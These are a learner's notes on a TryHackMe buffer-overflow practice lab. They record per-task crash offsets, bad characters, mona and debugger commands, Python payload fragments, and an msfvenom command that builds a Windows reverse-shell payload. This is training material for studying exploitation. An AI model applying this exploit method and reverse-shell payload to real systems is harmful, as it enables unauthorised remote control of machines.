https://tryhackme.com/room/bufferoverflowprep

https://docs.python.org/3/library/struct.html

https://docs.pwntools.com/en/stable/

This is the third attempt at this room, and mona still shows -1 for bad character incremental adds 1, removal of chars from the script does not work, cant deferentiate the black parts like the OSCP shows you can so manually. 4th attempt witht the JOhn hammond video, really sharpened everything up and the next day I finished the rest in < 4 hours 

```
!mona config -set workingfolder c:\mona\%p
```

```bash
msf-pattern_create -l 2000 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co
```

```powershell
!mona findmsp -distance 2000
```

![](bbbbsineip.png)

```bash
msf-pattern_offset -q $eip_address 
```


```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

`pip install badchars`

```
!mona compare -f C:\mona\oscp\bytearray.bin -a $esp
```

mona
- Look at vertical pattern
- count hex backwards displayed: 02,01 
- look for missing 
- Room suggests bad char corruption

![](no07.png)

```python
cmd = b"OVERFLOW1 "
pattern_length = 2000 # Documentation and keep for length retention
offset = 1978
payload = b"".join([
            cmd,
            b"A" * pattern_length,
        ])
```


Documentation and keep for pattern_length for length retention John Hammond discusses its requiement as changing attacker input amount total could alter how one would proceed to exploit the vulnerable app.  
```python
pattern_length = 2000 
offset = 1978
payload = b"".join([
			cmd,
            b"A" * pattern_length,
			b"C" *  (pattern_length - len(new_eip) - offset - len(all_chars)),
			]
		)
```

Encoding
```python
str.encode(my_str)
bad = [ 
	  b"\x00",
	  ]
all_chars = bytearray(range(1,256))
```
And bad characters
```python
all_chars = bytearray(range(1,256))

bad_chars = [
        b"\x07", 
        b"\x2d",
        b"\x2e",
        b"\xa0",
        ]
# Add bad char to bad_chars as we discover them
for bad_char in bad_chars:
    all_chars = all_chars.replace(bad_char, b"")

```



`!mona jmp -r esp`
- Look a protection
- Rebase - Do not include in a Dll or libraries that is not going to get reloaded - in binary itself is perfect, but always possible
- as many false options possible, but still matches bad character criteria
	- `!mona jmp -r esp -cpb "\x00"`
- ascii - often this is good as shellcode sometimes use ascii 
![](mitigation.png)

Struct
```python
import struct
struct.pack(">I", data) # big endian
struct.pack("<I", data) # little endian
```

Pwntool
```python 
>>> p8(0)
b'\x00'
>>> p32(0xdeadbeef)
b'\xef\xbe\xad\xde'
>>> p32(0xdeadbeef, endian='big')
b'\xde\xad\xbe\xef'
>>> with context.local(endian='big'): p32(0xdeadbeef)
b'\xde\xad\xbe\xef'

Make a frozen packer, which does not change with context.

>>> p=make_packer('all')
>>> p(0xff)
b'\xff'
>>> p(0x1ff)
b'\xff\x01'
>>> with context.local(endian='big'): print(repr(p(0x1ff)))
b'\xff\x01'
```

```python 
import struct
from pwn import p32

def customp32(data):
    return struct.pack("<I", data)

p32()
```

`!mona jmp -r esp -cpb "\x00"`

`ctrl + g` go to `$esp_address`
`f2` breakpoint on `$esp_address`
Step into  `F7`

`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b $badchars -f py -v shellcode `

```python
jmp_esp = 
padding = "\x90" * 48 # some multiple of 4!
shellcode = 
b"C" *  (pattern_length - len(new_eip) - offset - len(nop_sled) - len(shellcode)),
```

Change font size `Options -> Appearance -> Fonts -> Change button`
`ctrl + g` go to
`f2` - breakpoint
`ctrl + f2` - Restart
`f9` - Play
Step into  `F7`
Step over `F8`


```python
from pwn import *
ARCH=amd64 # i386, arm

print(shellcraft.ARCH.linux.sh()) 
print(asm(shellcraft.ARCH.linux.sh())) # assembly bytes 
```

Returning to bad cahr enumerate better than John Hammond. And mona actually works this time !@#$ AAAAAAAAAAAAAAARGH.

![](wtfmona.png)
Some of these are actually still displayed so we can discount these: - 01,02,03,04 
"Sometimes badchars cause the next byte to get corrupted as well"
Always the left!
07, 2e , a0 

One down 9 to go!

## OVERFLOW2

```
!mona config -set workingfolder c:\mona\%p
```
- sed command to changes these

10.10.63.219
bofcrash.py

sent to much and msf-patter_offset did not recognise it
```bash
msf-pattern_create -l 700 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A

```

```powershell
!mona findmsp -distance 700
```

```
Log data, item 17
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x76413176 (offset 634)

Log data, item 168
 Address=0BADF00D
 Message=    ESP (0x018bfa30) points at offset 638 in normal pattern (length 62)


```


```bash
msf-pattern_offset -q $eip_address 
```

`!mona bytearray -b "\x00"   `

```
!mona compare -f C:\mona\oscp\bytearray.bin -a $esp
```

23 24
3c 3d
83 84

\x00\x23\x3c\x83\xBA

24 - not
84 - not
3d - not

missed bA  and BB
`!mona jmp -r esp -cpb "\x00"`

```python
all_char.decode('UTF-8')

result = ''.join(format(x, '02x') for x in all_chars)
print(f"{str(result)}")

# forgot  , in all_chars
```


## OVERFLOW3

```
!mona config -set workingfolder c:\mona\%p
```
- sed command to changes these

10.10.63.219

Improved the fuzzer! - crashed at 1400

```bash
msf-pattern_create -l 1500 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9
```


```powershell
!mona findmsp -distance 1500
```

```
Log data, item 16
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x35714234 (offset 1274)
Log data, item 15
 Address=0BADF00D
 Message=    ESP (0x01a8fa30) points at offset 1278 in normal pattern (length 222)

```


```bash
msf-pattern_offset -q $eip_address 
```

`!mona bytearray -b "\x00"   `

```
!mona compare -f C:\mona\oscp\bytearray.bin -a $esp
```

Mona does not work again, will retry full retart of immunity..
First round
40 41
5f  60
b8 b9
ee ef

Second round
11 12

`\x00\x11\x40\x5f\xb8\xee`

## OVERFLOW4

This time I want to try see if mona work only on restart and get a shell:

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```


10.10.63.219

Fuzzing crashed at 2100


```bash
msf-pattern_create -l 2100  
```

enumeip.py

```powershell
!mona findmsp -distance 2100
```

```
Log data

Log data, item 17
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x70433570 (offset 2026)

Log data, item 16
 Address=0BADF00D
 Message=    ESP (0x018cfa30) points at offset 2030 in normal pattern (length 70)


```


```bash
msf-pattern_offset -q 0x70433570 
[*] Exact match at offset 2026
```

enumbadchars.py

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0x018cfa30
```

No not working again, potential it is the log directory...

First round:

a9 aa
cd ce
d4 d5

`\x00\xa9\xcd\xd4`

`!mona jmp -r esp -cpb "\x00\xa9\xcd\xd4"`

`625011AF`

`ctrl + g` go to `$esp_address`
`f2` breakpoint on `$esp_address`
Step into  `F7`

`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b $badchars -f py -v shellcode `

```python
jmp_esp = 
padding = "\x90" * 48 # some multiple of 4!
shellcode = 
b"C" *  (pattern_length - len(new_eip) - offset - len(nop_sled) - len(shellcode)),
```


A few typo fixes later:

![](woooooooow.png)


## OVERFLOW5

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```


10.10.63.219

Fuzzing crashed at 2100


```bash
msf-pattern_create -l 400  
```

enumeip.py

```powershell
!mona findmsp -distance 400
```

```
Log data

Log data, item 18
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x356b4134 (offset 314)
Log data, item 17
 Address=0BADF00D
 Message=    ESP (0x0181fa30) points at offset 318 in normal pattern (length 82)

```


```bash
msf-pattern_offset -q 0x356b4134 
[*] Exact match at offset 314
```

enumbadchars.py

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0x018cfa30
```

No not working again, potential it is the log directory...

First round:

16 17
2f 30
f4 f5
fd fe

`\x00\x16\x2f\xf4\xfd`

## OVERFLOW6

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```


10.10.63.219

Fuzzing crashed at 1100


```bash
msf-pattern_create -l 1100  
```

enumeip.py

```powershell
!mona findmsp -distance 1100
```

```
Log data

Log data, item 17
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x35694234 (offset 1034)

Log data, item 16
 Address=0BADF00D
 Message=    ESP (0x01adfa30) points at offset 1038 in normal pattern (length 62)

```


```bash
msf-pattern_offset -q 0x35694234 
[*] Exact match at offset 1034
```

enumbadchars.py

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0x01adfa30
```

No not working again, potential it is the log directory...

First round:

08 09
2c 2d
ad ae

`\x00\x08\x2c\xad`


## OVERFLOW7

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

10.10.16.62

Fuzzing crashed at 1400

```bash
msf-pattern_create -l 1400  
```

enumeip.py

```powershell
!mona findmsp -distance 1400
```

```
Log data

Log data, item 17
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x72423572 (offset 1306)

Log data, item 16
 Address=0BADF00D
 Message=    ESP (0x01affa30) points at offset 1310 in normal pattern (length 90)

```


```bash
msf-pattern_offset -q 0x72423572 
[*] Exact match at offset 1306
```

enumbadchars.py

``` 
# dont write the 0x
!mona compare -f C:\mona\oscp\bytearray.bin -a 01affa30
```

Mona is working I just put the wrong address and and had 0x

First round:

8c
ae
be
fb

`\x00\x8c\xae\xbe\xfb`

`!mona jmp -r esp -cpb "\x00\xa9\xcd\xd4"`[]

`625011AF`

`ctrl + g` go to `$esp_address`
`f2` breakpoint on `$esp_address`
Step into  `F7`

`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b $badchars -f py -v shellcode`


## OVERFLOW8

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

10.10.16.62

Fuzzing crashed at 1800

```bash
msf-pattern_create -l 1800  
```

enumeip.py

```powershell
!mona findmsp -distance 1800
```

```
Log data

Log data, item 16
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x68433568 (offset 1786)


Log data, item 15
 Address=0BADF00D
 Message=    ESP (0x0198fa30) points at offset 1790 in normal pattern (length 10)


```


```bash
msf-pattern_offset -q 0x68433568 
[*] Exact match at offset 1786
```

enumbadchars.py

``` 
# dont write the 0x
!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a 018CFA30
```

MONA WORKING! 

1d
2e
c7
ee

`\x00\x1d\x2e\xc7\xee`


## OVERFLOW9

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

10.10.16.62

Fuzzing crashed at 1600

```bash
msf-pattern_create -l 1600  
```

enumeip.py

```powershell
!mona findmsp -distance 1600
```

```
Log data

Log data, item 17
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x35794234 (offset 1514)
 
Log data, item 16
 Address=0BADF00D
 Message=    ESP (0x0193fa30) points at offset 1518 in normal pattern (length 82)

# Actually dont need this!
```


```bash
msf-pattern_offset -q 0x35794234 
[*] Exact match at offset 1514
```

enumbadchars.py

``` 
# dont write the 0x
!mona bytearray -b "\x00"
# use brain see CPU 
!mona compare -f C:\mona\oscp\bytearray.bin -a $changes
```

MONA WORKING! 

First
`\x00\x04\x3e\xe1`
Second  - the `\x3f` coprrupts the `\x40`
`\x00\x04\x3e\x3f\xe1`

## OVERFLOW10

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

10.10.16.62

Fuzzing crashed at 600

```bash
msf-pattern_create -l 600  
```

enumeip.py

```powershell
!mona findmsp -distance 600
```

```
Log data

Log data, item 17
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x41397241 (offset 537)


```


```bash
msf-pattern_offset -q 0x41397241 
[*] Exact match at offset 537
```

enumbadchars.py

``` 
# dont write the 0x
!mona bytearray -b "\x00"
# use brain see CPU 
!mona compare -f C:\mona\oscp\bytearray.bin -a $changes
```

MONA WORKING! 

a0 a1
ad ae
be bf 
de df 
ef f0

`\x00\xa0\xad\xbe\xde\xef`


